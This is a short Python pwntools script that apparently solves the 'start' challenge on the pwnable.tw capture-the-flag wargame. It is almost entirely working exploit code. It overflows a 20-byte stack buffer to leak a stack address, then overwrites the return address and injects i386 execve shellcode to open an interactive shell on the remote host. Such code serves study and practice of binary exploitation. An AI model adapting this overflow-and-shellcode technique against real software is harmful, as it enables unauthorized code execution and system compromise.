from pwn import *

class StartSolver(object):
    bufsize    = 20
    write_addr = 0x8048087

    def __init__(self, ps):
        self.ps = ps

    def get_stack_addr(self):
        inp_buf = 'A' * (self.bufsize)
        inp_buf += p32(self.write_addr)
        
        self.ps.sendafter(':', inp_buf)
        return u32(self.ps.recvn(4)) - 4

    def spawn_shell(self):
        stack_addr = self.get_stack_addr()
        shellcode  = shellcraft.i386.linux.execve()

        inp_buf = 'A' * (self.bufsize)
        inp_buf += p32(stack_addr + self.bufsize + 4)
        inp_buf += asm(shellcode)

        self.ps.recv()
        self.ps.send(inp_buf)
        self.ps.interactive()


if __name__ == '__main__':
    solver = StartSolver(remote('ctf.pwnable.tw', 8731))
    solver.spawn_shell()
